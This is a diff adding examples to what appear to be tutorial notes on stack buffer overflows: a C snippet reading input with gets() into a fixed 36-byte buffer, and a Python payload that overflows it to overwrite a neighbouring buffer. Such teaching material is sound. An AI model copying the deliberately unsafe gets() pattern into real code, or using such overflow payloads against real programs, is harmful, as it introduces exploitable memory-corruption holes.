@@ -77,6 +77,26 @@ p.sendline((b"A" * padding) + p32(0xDEADBEEF))
 
 ---
 
+```c
+// ...
+char expected[36];
+char actual[36];
+strcpy(expected, "something something");
+
+gets(actual);
+printf("  actual: %s\n", actual);
+printf("expected: %s\n", expected);
+```
+
+```py
+import sys
+
+magic_constant = 12  # obtained through trial-and-error
+sys.stdout.buffer.write(b"A" * 35 + b"\x00" + b"A" * (35 + magic_constant))
+```
+
+---
+
 ### changing (especially useful) stuff on the stack
 
 1. set a breakpoint in the vulnerable function
